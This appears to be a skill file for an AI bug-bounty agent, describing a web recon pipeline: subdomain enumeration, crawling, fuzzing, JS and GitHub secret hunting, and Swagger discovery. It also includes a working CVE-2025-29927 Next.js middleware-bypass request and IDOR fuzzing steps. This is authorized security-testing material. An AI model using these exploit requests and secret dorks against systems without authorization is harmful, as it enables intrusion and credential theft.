---
name: web2-recon
description: Web2 recon pipeline — subdomain enumeration (subfinder, Chaos API, assetfinder), live host discovery (dnsx, httpx), URL crawling (katana, waybackurls, gau), directory fuzzing (ffuf), JS analysis (LinkFinder, SecretFinder), continuous monitoring (new subdomain alerts, JS change detection, GitHub commit watch). Use when starting recon on any web2 target or when asked about asset discovery, subdomain enum, or attack surface mapping.
---

# WEB2 RECON PIPELINE

Full asset discovery from nothing to a prioritized URL list ready for hunting.

---

## SETUP (one-time)

```bash
# 1. Set your Chaos API key (get free key at chaos.projectdiscovery.io)
export CHAOS_API_KEY="your-key-here"
# Add to ~/.zshrc or ~/.bashrc for persistence:
echo 'export CHAOS_API_KEY="your-key-here"' >> ~/.zshrc

# 2. Update nuclei templates (run weekly)
nuclei -update-templates

# 3. Configure subfinder with API keys for more sources
mkdir -p ~/.config/subfinder
cat > ~/.config/subfinder/config.yaml << 'EOF'
# Get free keys at: virustotal.com, securitytrails.com, censys.io, shodan.io
virustotal: [YOUR_VT_KEY]
securitytrails: [YOUR_ST_KEY]
censys_apiid: YOUR_CENSYS_ID
censys_secret: YOUR_CENSYS_SECRET
shodan: [YOUR_SHODAN_KEY]
EOF

# 4. Verify all tools installed
which subfinder httpx dnsx nuclei katana waybackurls gau dalfox ffuf anew gf interactsh-client
```

---

## THE 5-MINUTE TRIAGE (prioritization, not a stop sign)

> This is about ORDER of effort when choosing among many programs, NOT a reason to abandon an
> assigned/authorized target. If you were told to hunt this target, hunt it fully (see
> `redteam-mindset`: recon-is-not-hunting). Use the signals below only to decide what to hit first.

**Low-signal indicators (deprioritize vs richer surface, don't abandon an in-scope asset):**
- All subdomains return 403 or static marketing pages → pivot to alt-port scan, JS bundles, API spec paths, sibling TLDs before concluding "dead"
- No API endpoints visible in crawled URLs → check `/_next/data`, Swagger/OpenAPI paths, GraphQL, mobile-app traffic
- No JS bundles with interesting endpoints → re-crawl authenticated, diff after login
- nuclei returns 0 medium/high → nuclei misses logic/authz bugs entirely; absence of nuclei hits means nothing
- No forms/auth/user data visible yet → register an account and re-map

---

## STANDARD RECON PIPELINE

### Pre-Hunt: Always Run First

```bash
TARGET="target.com"

# Step 0: Passive — crt.sh certificate transparency (no API key needed)
# JSON often 502s/times out on large domains. Retry once, then HTML, then skip.
curl -sS --max-time 30 "https://crt.sh/?q=%25.${TARGET}&output=json" \
  | jq -r '.[].name_value' 2>/dev/null \
  | sed 's/\*\.//g' \
  | sort -u > /tmp/subs.txt
if [ ! -s /tmp/subs.txt ]; then
  curl -sS --max-time 30 "https://crt.sh/?q=%25.${TARGET}" \
    | grep -oE '[a-zA-Z0-9._-]+\.'"${TARGET}" | sort -u > /tmp/subs.txt
fi
echo "[+] crt.sh: $(wc -l < /tmp/subs.txt) subdomains"

# Step 1: Chaos API (ProjectDiscovery — most comprehensive source)
# Chaos returns labels ("api", "1.dev"), not FQDNs. Append the parent domain.
curl -s "https://dns.projectdiscovery.io/dns/$TARGET/subdomains" \
  -H "Authorization: $CHAOS_API_KEY" \
  | jq -r --arg d "$TARGET" '.subdomains[]? | select(. != "*" and . != "") | . + "." + $d' >> /tmp/subs.txt

echo "[+] Chaos returned $(wc -l < /tmp/subs.txt) subdomains"

# Step 2: subfinder (passive multi-source)
subfinder -d $TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only $TARGET | anew /tmp/subs.txt

echo "[+] Total subdomains after all sources: $(wc -l < /tmp/subs.txt)"

# Step 3: DNS resolution + live host check
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect | tee /tmp/live.txt

echo "[+] Live hosts: $(wc -l < /tmp/live.txt)"

# Step 4: URL crawl
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -jc -kf all -silent | anew /tmp/urls.txt

# Step 5: Historical URLs
echo $TARGET | waybackurls | anew /tmp/urls.txt
gau $TARGET --subs | anew /tmp/urls.txt

echo "[+] Total URLs: $(wc -l < /tmp/urls.txt)"

# Step 6: Nuclei scan — httpx -status-code -title lines are NOT a URL list.
awk '{print $1}' /tmp/live.txt > /tmp/live-urls.txt
nuclei -l /tmp/live-urls.txt -t ~/nuclei-templates/ -severity critical,high,medium -o /tmp/nuclei.txt
```

### Output to Organized Directory

```bash
TARGET="target.com"
RECON_DIR="recon/$TARGET"
mkdir -p $RECON_DIR

# All outputs go here:
/tmp/subs.txt         → $RECON_DIR/subdomains.txt
/tmp/live.txt         → $RECON_DIR/live-hosts.txt
/tmp/urls.txt         → $RECON_DIR/urls.txt
/tmp/nuclei.txt       → $RECON_DIR/nuclei.txt
```

---

## ATTACK SURFACE TRIAGE

### Find Interesting Targets in URL List

```bash
# Parameters worth testing
cat /tmp/urls.txt | grep -E "[?&](id|user|file|path|url|redirect|next|src|token|key|api_key)=" | tee /tmp/interesting-params.txt

# API endpoints
cat /tmp/urls.txt | grep -E "/api/|/v1/|/v2/|/v3/|/graphql|/rest/|/gql" | tee /tmp/api-endpoints.txt

# File upload endpoints
cat /tmp/urls.txt | grep -E "upload|file|attachment|document|image|avatar|photo|media" | tee /tmp/uploads.txt

# Admin/internal paths
cat /tmp/urls.txt | grep -E "/admin|/internal|/debug|/test|/staging|/dev|/management|/console" | tee /tmp/admin-paths.txt

# Authentication endpoints
cat /tmp/urls.txt | grep -E "/oauth|/login|/auth|/sso|/saml|/oidc|/callback|/token" | tee /tmp/auth-paths.txt
```

### gf Patterns (Quick Classification)

```bash
# Install gf patterns: https://github.com/tomnomnom/gf
cat /tmp/urls.txt | gf xss | tee /tmp/xss-candidates.txt
cat /tmp/urls.txt | gf ssrf | tee /tmp/ssrf-candidates.txt
cat /tmp/urls.txt | gf idor | tee /tmp/idor-candidates.txt
cat /tmp/urls.txt | gf sqli | tee /tmp/sqli-candidates.txt
cat /tmp/urls.txt | gf redirect | tee /tmp/redirect-candidates.txt
cat /tmp/urls.txt | gf lfi | tee /tmp/lfi-candidates.txt
cat /tmp/urls.txt | gf rce | tee /tmp/rce-candidates.txt
```

---

## JS ANALYSIS

### SecretFinder (API keys, tokens in JS bundles)

```bash
# Activate venv
source ~/tools/SecretFinder/.venv/bin/activate

# Scan a single JS file
python3 ~/tools/SecretFinder/SecretFinder.py -i "https://target.com/static/js/main.js" -o cli

# Scan JS URLs found in recon. Auth/admin/api hosts first; do not drop the rest.
cat /tmp/urls.txt | grep "\.js$" | awk '
  /auth|admin|api|login|app|portal/ { print; next }
  { rest[NR]=$0 }
  END { for (i in rest) print rest[i] }
' | while read url; do
  echo "=== $url ==="
  python3 ~/tools/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
done

deactivate
```

### LinkFinder (Endpoints hidden in JS)

```bash
source ~/tools/LinkFinder/.venv/bin/activate

# Single JS file
python3 ~/tools/LinkFinder/linkfinder.py -i "https://target.com/app.js" -o cli

# All pages (crawls JS from HTML)
python3 ~/tools/LinkFinder/linkfinder.py -i "https://target.com" -d -o cli

deactivate

# Sibling sourcemaps — a 200 with "sourcesContent" is the original source. Record the URL; do not mirror the repo.
cat /tmp/urls.txt | grep -E '\.js$' | sed 's/$/.map/' | while read url; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -m 8 "$url")
  [ "$code" = "200" ] && echo "MAP $url"
done
```

---

## DIRECTORY FUZZING

### ffuf — Standard Fuzzing

```bash
# Directory discovery on a live host
ffuf -u "https://target.com/FUZZ" \
     -w ~/wordlists/common.txt \
     -mc 200,201,204,301,302,307,401,403 \
     -ac \
     -t 40 \
     -o /tmp/ffuf-dirs.json

# API endpoint discovery
ffuf -u "https://target.com/api/FUZZ" \
     -w ~/wordlists/api-endpoints.txt \
     -mc 200,201,204,301,302 \
     -ac \
     -t 20

# IDOR: two ids you already have (yours and one other test account). Stop at the first foreign marker.
# Do not walk seq 1..N. A 200 with your own object is not a finding.
ffuf -request /tmp/req.txt \
     -request-proto https \
     -w <(printf '%s\n' "$MY_ID" "$OTHER_ID") \
     -mc 200 \
     -ac \
     -t 2
```

---

## TARGET ORDER — when several authorized programs are in the queue

An assigned in-scope target is hunted. The points only decide which authorized program to open first. A low score, a small bounty, a saturated hacktivity, or a marketing homepage is not a stop. Out-of-scope and an explicit program exclusion are the stops.

| Criterion | Points |
|---|---|
| Max bounty >= $5K | +2 |
| Large user base (>100K) or handles money | +2 |
| Program launched < 60 days ago | +2 |
| Complex features: API, OAuth, file upload, GraphQL | +1 |
| Recent code/feature changes (GitHub, changelog) | +1 |
| Private program (less competition) | +1 |
| Tech stack you know | +1 |
| Source code available | +1 |
| Prior disclosed reports to study | +1 |

Higher score → start here. Then finish the assigned target anyway: alt ports, JS, API specs, sibling TLDs, an account if registration is allowed.

---

## TECH STACK DETECTION (2 min)

```bash
# Response headers reveal backend
curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"

# Common signals:
# Server: nginx + X-Powered-By: PHP/7.4 → PHP backend
# Server: gunicorn OR X-Powered-By: Express → Python/Node.js
# X-Powered-By: ASP.NET → .NET
# Server: Apache Tomcat → Java
# X-Runtime: Ruby → Ruby on Rails

# Framework from JS bundle paths:
# /_next/static/ → Next.js
# /static/js/main.chunk.js → CRA (React)
# /packs/ → Ruby on Rails + Webpacker
# /__nuxt/ → Nuxt.js (Vue)
```

### Stack → Primary Bug Class Map

| Stack | Hunt First | Hunt Second |
|---|---|---|
| Ruby on Rails | Mass assignment | IDOR (`:id` routes) |
| Django | IDOR (ModelViewSet, no object perms) | SSTI (mark_safe) |
| Flask | SSTI (render_template_string) | SSRF (requests lib) |
| Laravel | Mass assignment ($fillable) | IDOR (Eloquent, no ownership) |
| Express (Node.js) | Prototype pollution | Path traversal |
| Spring Boot | Actuator (/actuator/heapdump, /env, /gateway/routes) | SpEL injection / SSTI (Thymeleaf) |
| ASP.NET | ViewState deserialization (signed-only + machineKey) | Open redirect (ReturnUrl) |
| Next.js | Middleware auth bypass (CVE-2025-29927, below) | SSRF via Server Actions / image optimizer |
| GraphQL | Introspection → auth bypass on mutations | IDOR via node(id:) |
| WordPress | Plugin SQLi | REST API auth bypass |

### Next.js middleware bypass (CVE-2025-29927) — one request

Affected: 11.1.4–12.3.4, 13.0.0–13.5.8, 14.0.0–14.2.24, 15.0.0–15.2.2. Patched in 12.3.5, 13.5.9, 14.2.25, 15.2.3. Proof is a body-diff on a route that redirects or 401s without the header and returns a marker you should not see with it. The same body both times is not a bypass.

```bash
# 15.x before the patch: the value must exceed the recursion depth (5).
# Older lines often accept a single "middleware" or "src/middleware".
curl -sk -D- -o /tmp/nx-off.txt "https://$TARGET/admin"
curl -sk -D- -o /tmp/nx-on.txt -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" "https://$TARGET/admin"
# Also try src/middleware and pages/_middleware, each repeated five times. Diff the two bodies.
```

---

## CONTINUOUS MONITORING SETUP

Set up once per target. Alerts you before other hunters.

### New Subdomain Alerts (daily cron)

```bash
#!/bin/bash
TARGET="target.com"
KNOWN="/tmp/$TARGET-subs-known.txt"

subfinder -d $TARGET -silent > /tmp/$TARGET-subs-fresh.txt
curl -s "https://dns.projectdiscovery.io/dns/$TARGET/subdomains" \
  -H "Authorization: $CHAOS_API_KEY" \
  | jq -r --arg d "$TARGET" '.subdomains[]? | select(. != "*" and . != "") | . + "." + $d' >> /tmp/$TARGET-subs-fresh.txt

# Diff against known
NEW=$(comm -23 <(sort /tmp/$TARGET-subs-fresh.txt) <(sort $KNOWN 2>/dev/null))

if [ -n "$NEW" ]; then
  echo "NEW SUBDOMAINS: $NEW"
  echo "$NEW" >> $KNOWN
fi

# Schedule: crontab -e → 0 8 * * * /bin/bash ~/monitors/subs-watch.sh
```

### JS bundle change watch (first-mover on redeploys)

A new `main.<hash>.js` / `/_next/static/<buildId>/` is new endpoints and sometimes new secrets. Hash the live entry bundles daily; on change, hand the old+new bytes to `changed-js-deepdive` (`engine/jsdiff.py`). Do not re-crawl the whole app.

```bash
#!/bin/bash
TARGET="target.com"
STATE="/tmp/$TARGET-js-hashes.txt"
curl -sL "https://$TARGET/" | grep -oE 'src="[^"]+\.js"' | sed 's/src="//;s/"//' | sort -u > /tmp/$TARGET-js-now.txt
: > /tmp/$TARGET-js-new.txt
while read src; do
  case "$src" in http*) url="$src" ;; *) url="https://$TARGET/${src#/}" ;; esac
  hash=$(curl -sL -m 15 "$url" | sha256sum | awk '{print $1}')
  echo "$url $hash" >> /tmp/$TARGET-js-new.txt
done < /tmp/$TARGET-js-now.txt
if [ -f "$STATE" ]; then
  comm -13 <(sort "$STATE") <(sort /tmp/$TARGET-js-new.txt) | while read url hash; do
    echo "CHANGED JS: $url"
    # python3 engine/jsdiff.py fetch --old "<previous>" --new "$url"  → changed-js-deepdive
  done
fi
cp /tmp/$TARGET-js-new.txt "$STATE"
# Schedule: 0 */6 * * * /bin/bash ~/monitors/js-watch.sh
```

### GitHub Commit Watch

```bash
#!/bin/bash
REPO="TargetOrg/target-app"
LAST_SHA="/tmp/$REPO-last-sha.txt"

CURRENT=$(curl -s "https://api.github.com/repos/$REPO/commits?per_page=1" | jq -r '.[0].sha')
KNOWN=$(cat $LAST_SHA 2>/dev/null)

if [ "$CURRENT" != "$KNOWN" ]; then
  echo "New commit on $REPO: $CURRENT"
  echo $CURRENT > $LAST_SHA
  # Get changed files
  curl -s "https://api.github.com/repos/$REPO/commits/$CURRENT" \
    | jq -r '.files[].filename' | grep -E "auth|middleware|route|permission|role|admin"
fi

# Schedule: */30 * * * * /bin/bash ~/monitors/github-watch.sh
```

---

## PORT SCANNING (often skipped — don't skip)

```bash
# naabu — fast port scanner from ProjectDiscovery
# Finds non-standard ports: 8080, 8443, 3000, 8888, 9000, etc.
cat /tmp/live.txt | awk '{print $1}' | naabu -port 80,443,8080,8443,3000,4000,5000,8000,8888,9000,9090,9200,6379,6443,10250,2375,27017 -silent | tee /tmp/open-ports.txt

# Why this matters: admin panels, debug services, internal APIs often run on alt ports
# Example wins: :8080/actuator/env (Spring Boot), :9200/_cat/indices (Elasticsearch), :6379 (Redis)
```

## SECRET SCANNING IN JS BUNDLES

```bash
# trufflehog v3 (Go binary). Do not `pip install trufflehog3` — that is a different CLI.
trufflehog filesystem --only-verified "recon/$TARGET/"

# SecretFinder — manual JS bundle scan (already in tools/)
source ~/tools/SecretFinder/.venv/bin/activate
cat /tmp/urls.txt | grep "\.js$" | while read url; do
  python3 ~/tools/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
done
deactivate

# Quick grep for common patterns in downloaded JS
wget -q -r -l 1 -A "*.js" -P /tmp/js-files/ "https://$TARGET" 2>/dev/null
grep -rn "api_key\|apiKey\|client_secret\|access_token\|private_key\|AWS_SECRET\|AKIA" /tmp/js-files/ 2>/dev/null
```

## GITHUB DORKING FOR TARGET

```bash
# Search GitHub for hardcoded secrets before hunting the app
TARGET_ORG="TargetOrgName"  # Check their GitHub org

# Useful dorks (search on github.com):
# org:TARGET_ORG password
# org:TARGET_ORG api_key
# org:TARGET_ORG "Authorization: Bearer"
# org:TARGET_ORG .env
# org:TARGET_ORG "BEGIN RSA PRIVATE KEY"

# CLI with gh (GitHub CLI):
gh search code "api_key" --owner "$TARGET_ORG" --json path,repository 2>/dev/null | jq '.'
gh search code "password" --owner "$TARGET_ORG" --json path,repository 2>/dev/null | head -20

# GitDorker (if installed):
python3 ~/tools/GitDorker/GitDorker.py -t GITHUB_TOKEN -d ~/tools/GitDorker/Dorks/alldorksv3 -q "$TARGET" -org
```

## 30-MINUTE RECON PROTOCOL

### Minutes 0-5: Read Program Page

```
Note:
- ALL in-scope assets (every domain listed)
- Out-of-scope list (read carefully — common trap)
- Safe harbor statement
- Impact types accepted (some exclude "low")
- Average bounty amount (signals program generosity)
```

### Minutes 5-15: Asset Discovery

Run the standard pipeline above. Focus on live.txt output.

### Minutes 15-25: Surface Map

Run gf patterns and the interesting-params grep above.

### Minutes 25-30: Manual Exploration

Open Burp Suite. Browse the app with proxy on:
1. Register an account
2. Perform main user actions (create/read/update/delete resources)
3. Note all API calls in Burp history
4. Look for endpoints not in your URL list

### After 30 min: Prioritize

```
Priority 1: API endpoints with ID parameters → IDOR candidates
Priority 2: File upload features → XSS/RCE candidates
Priority 3: OAuth/SSO flows → auth bypass candidates
Priority 4: Search/filter with user input → SQLi/SSRF/SSTI candidates
Priority 5: Admin/debug endpoints → auth bypass candidates
```

---

## Toolchain fallback (when `dnsx` / `httpx` crash)

The projectdiscovery Go binaries (`dnsx`, `httpx`, `naabu`) occasionally `SIGSEGV` on macOS arm64 due to a cgo / system-resolver interaction. The crash signature is identical regardless of install method — both `brew install` and `go install github.com/projectdiscovery/<tool>@latest` produce binaries that segfault at the same address. Smoke-test once before relying on them in a real engagement:

```bash
dnsx -version   # if SIGSEGV: use the dig fallback below
httpx -version  # if SIGSEGV: use the curl fallback below
```

### `dnsx` → `dig` fallback

```bash
# Replaces: dnsx -l subs.txt -a -resp -silent
while read s; do
  ips=$(dig +short +tries=1 +time=3 "$s" \
    | grep -E '^[0-9.]+$' \
    | paste -sd, -)
  [ -n "$ips" ] && echo "$s|$ips"
done < subs.txt
```

### `httpx` → `curl` fallback

```bash
# Replaces: httpx -l subs.txt -silent -status-code -title -tech-detect
while read s; do
  resp=$(curl -s -L -m 5 -o /tmp/body \
    -w "%{http_code}|%{url_effective}|%{header_server}" \
    "https://$s")
  code=$(echo "$resp" | cut -d'|' -f1)
  if [ "$code" != "000" ]; then
    title=$(grep -oE '<title[^>]*>[^<]*</title>' /tmp/body | head -1 | sed 's/<[^>]*>//g')
    echo "$s|$resp|$title"
  fi
done < subs.txt
```

**Trade-off:** Serial vs. concurrent. The fallback handles ~24 subdomains in 14 seconds; the same workload on `httpx` with default 50 threads finishes in 2-3 seconds. For VDP-scale recon (< 100 subdomains) the fallback is fine. For mass recon (1000+) fix the toolchain first.

Verified against HackerOne's own VDP in `docs/verification/recon-hackerone-vdp.md`.

---

## API Spec / Swagger / OpenAPI Discovery (2024-2026 surface)

API spec endpoints are the single highest-leverage recon target on any modern .NET / Node / Python / Java backend. The spec discloses every endpoint, HTTP methods, parameter names + types + formats, models, validation rules — a complete attack-map in JSON. Default routes are commonly left enabled in production. **Add this wordlist to the directory-fuzzing phase** (after the standard `common.txt` pass).

### Default discovery path wordlist (paste into `swagger-paths.txt`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger
/swagger/
/swagger/index.html
/swagger/ui/index.html
/swagger/v1/swagger.json
/swagger/v2/swagger.json
/swagger/v3/swagger.json
/swagger/docs/v1
/swagger/docs/v2
/swagger-ui
/swagger-ui/
/swagger-ui.html
/swagger-resources
/swagger-resources/configuration/ui
/nswag
/nswag/index.html
/api/swagger
/api/swagger.json
/api/swagger/v1/swagger.json
/api/openapi
/api/openapi.json
/api/v1/swagger.json
/api/v2/swagger.json
/api-docs
/api-docs/swagger.json

# OpenAPI generic
/openapi
/openapi.json
/openapi.yaml
/openapi.yml
/openapi/v1.json
/openapi/v2.json
/openapi/v3.json
/.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs
/v3/api-docs
/v3/api-docs.yaml
/v3/api-docs/swagger-config
/swagger-ui/index.html

# Python (FastAPI / Flask-RESTPlus / Connexion / DRF)
/docs
/docs/
/redoc
/redoc/
/openapi.json
/swagger.json
/swagger/?format=openapi
/swagger.yaml

# Express / Node / Hapi
/api-docs
/api-docs.json
/swagger.json
/swagger-stats
/graphql-docs

# GraphQL adjacent (often co-located)
/graphql
/graphiql
/playground
/altair
/voyager
/graphql/console
/graphql-explorer

# ReDoc / RapiDoc / Stoplight / alt UIs
/redoc
/redoc.html
/redoc-ui.html
/rapidoc
/rapidoc.html
/stoplight
/elements

# Misc / dev-leftover
/actuator
/actuator/openapi
/actuator/mappings
/q/openapi
/q/swagger-ui
/docs/swagger.json
/api/v1/docs
/api/v2/docs
/internal/swagger
/admin/swagger
/management/swagger
```

### Integration with the standard pipeline

```bash
# After live-urls.txt is built. FUZZ is the PATH, not the hostname.
ffuf -w swagger-paths.txt -u "https://target.comFUZZ" -mc 200,302 -fs 0 -t 20 -o swagger-hits.json
# wordlist entries already start with / (/swagger, /openapi.json). Do not prefix another slash.
# Content-aware (preferred on many hosts):
httpx -l /tmp/live-urls.txt -path swagger-paths.txt -mc 200 -mr "swagger|openapi" -json | tee swagger-hits.jsonl
# For every hit:
jq '.paths | keys' swagger.json > endpoints.txt
jq '.components.schemas' swagger.json > schemas.json   # mass-assignment field candidates
```

### Why this matters for recon-to-hunting handoff

- **Spec → mass IDOR/BOLA** — `jq '.paths | keys' swagger.json` becomes the input list for `Autorize`/`ffuf` per-user testing.
- **Spec → mass-assignment payload construction** — `components.schemas.UserUpdateDto` enumerates `isAdmin`, `emailVerified`, `tenantId`, `role`.
- **Spec → hidden endpoint discovery** — `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes documented but never auth-gated.
- **Spec → injection-class seeding** — every parameter's type + format + enum + max-length means payloads pass validation before reaching the sink. Especially valuable against ASP.NET Core where the model binder rejects malformed input before any controller logic.

### Tools

- `kiterunner` — natively ingests OpenAPI spec, generates requests against the API.
- `sj` (Swagger Jacker) — purpose-built for Swagger spec exploitation.
- `apidetector` (brinhosa) — Swagger-UI mass scanner.
- `XSSwagger` (vavkamil) — detects vulnerable Swagger UI versions (CVE-2018-25031 family).
- `nuclei -t http/exposures/apis/` — built-in templates for default spec paths.

### Anti-pattern reminder

A 404/403 on `/swagger` does NOT mean no spec is exposed. Many .NET projects route the spec under `/api/swagger/v1/swagger.json` rather than `/swagger`. Always test the full path list, not just the root.

Full attack-chain analysis is in `hunt-api-misconfig` → `NSwag / Swagger / OpenAPI Spec Exposure`.

---

## Related Skills & Chains

- **`offensive-osint`** — When recon needs concrete probes / wordlists / regexes beyond the basic pipeline. Workflow primitive: this skill produces the URL set; `offensive-osint` provides the secret regexes, GraphQL/Swagger paths, and identity-fabric probes you apply to that URL set.
- **`osint-methodology`** — When you need a severity rubric for what you discovered. Workflow primitive: after recon outputs `subdomains.txt` / `live-hosts.txt` / `urls.txt`, score each asset against `osint-methodology`'s findings rubric to decide what gets a finding versus what stays in the asset graph.
- **`hunt-subdomain`** — When recon surfaces stale CNAMEs / dangling DNS. Workflow primitive: any subdomain in `subdomains.txt` whose CNAME points to S3 / GitHub Pages / Heroku / Shopify / Azure should auto-route to `hunt-subdomain` for takeover validation.
- **`security-arsenal`** — When the URL set is classified by `gf` and ready for active testing. Workflow primitive: `gf xss/ssrf/sqli/idor` output names become payload-class queries against `security-arsenal`'s payload library.
- **`bb-methodology`** — When recon completes and Phase 1 transitions to Phase 2 (Mapping). Workflow primitive: hand the live host + URL set back to `bb-methodology` Phase 2 for endpoint mapping and Phase 3 vulnerability discovery routing.

---

## Operator Notes (Claude-BugHunter)

> Engagement-derived + 2026-specific additions to the vendored foundation.
> Wisdom from real authorized engagements + Phase 2 verification across
> this repo's 31+ skill-area live tests. The upstream pipeline covers the WHAT;
> this layer covers the WHEN-IT-WORKS-vs-WHEN-IT-DOESN'T.

### Cross-TLD pivot discipline

Phase 2C's HackerOne VDP recon walked from `hackerone.com` (24 subdomains) into a sister TLD `hacker.one` (12 more subdomains found in JS bundle references). Operators who only enumerate `*.target.com` miss attack surface that the target legitimately operates on a different domain.

Always grep JS bundles for plausible sibling TLDs:

```bash
# pull all JS, grep for sibling-TLD candidates
for url in $(cat live-hosts.txt); do
  curl -s "$url" | grep -oE 'src="[^"]+\.js"' | sed 's/src="//;s/"//'
done | sort -u > js-urls.txt

# then on each JS file
for j in $(cat js-urls.txt); do
  curl -s "$j" | grep -oE '[a-z0-9.-]+\.(io|app|one|dev|test|cloud|ai|co)' | sort -u
done | sort -u > sibling-tld-candidates.txt
```

Common sibling-TLD patterns: `target.com → target.io / target.app / target.one / target.dev / target.test / target-corp.com / target-cdn.net`. Always validate via WHOIS or by checking if the cert chain trusts the same internal CA before treating the sister TLD as in-scope.

### Subdomain wordlist priorities by 2026

Top discovery prefixes by hit rate against enterprise VDPs in our 2024-2026 corpus:

```
mta-sts.*          api.*              docs.*
dev-*              staging-*          *-qa
*-stage            *-uat              events.*
portal.*           customer.*         partner.*
vendor.*           internal-*         admin-*
employee-*         hr.*               jobs.*
sso.*              auth.*             id.*
```

Internal-looking subdomains often expose more surface than the marketing site — `partner.target.com` and `vendor-portal.target.com` frequently have weaker auth than the main app because they're scoped for "trusted" external users. Always send a probe to the long-tail wordlist after the standard subfinder run completes.

### Live-host probe: how to fingerprint stack quickly

`curl -sI <host>` headers are 80% of the fingerprint:

- `Server:` — apache / nginx / cloudflare / kestrel (= .NET Core) / openresty / envoy
- `X-Powered-By:` — PHP version, ASP.NET version, Express.js
- `X-Drupal-Cache`, `X-Generator: Drupal 9` — Drupal
- `X-Generator: WordPress` — WordPress
- `Via:` — CDN chain (1.1 varnish, 1.1 cloudfront)
- `Set-Cookie:` names — `JSESSIONID` (Java), `PHPSESSID` (PHP), `ASP.NET_SessionId` (.NET), `connect.sid` (Express), `laravel_session` (Laravel)

JS bundle filename patterns:

- `/_next/static/` = Next.js
- `/_nuxt/` = Nuxt
- `/assets/static/` with hash filenames = Vite
- `/static/js/main.*.chunk.js` = Create React App
- `runtime.*.js + polyfills.*.js + main.*.js` = Angular CLI

The first 10s of recon should yield a stack guess; the rest is targeting. If your fingerprint contradicts itself (Server says nginx, Set-Cookie says ASP.NET) you've found a reverse proxy front-end — note the origin app for later smuggling/cache attacks.

### GitHub Pages 404 vs takeover signal

Critical distinction operators get wrong:

- **"Page not found · GitHub Pages"** with HTTP 404 means the repo EXISTS — NOT a takeover.
- **"There isn't a GitHub Pages site here"** means the repo was deleted — TAKEOVER candidate.

Same distinction for CloudFront:

- **"Error - 404"** with `Server: CloudFront` = distribution exists, origin returned 404 — NOT a takeover.
- **"The request could not be satisfied"** with `X-Cache: Error from cloudfront` = origin missing entirely — potential takeover.

Phase 2C verified both patterns live. Always check the EXACT response body string before filing a takeover finding — the takeover-scanner tools (subzy, subjack) match on multiple fingerprints and frequently false-positive on the "still owned, just empty" case.

### Toolchain fallback

Already covered in this file's Phase 2C addition. Quick reminder: dnsx/httpx may segfault on macOS arm64; the dig+curl fallback works for < 100-host runs in ~14 seconds. Don't burn an hour debugging Go binary panics when the fallback gets you to the same URL set.
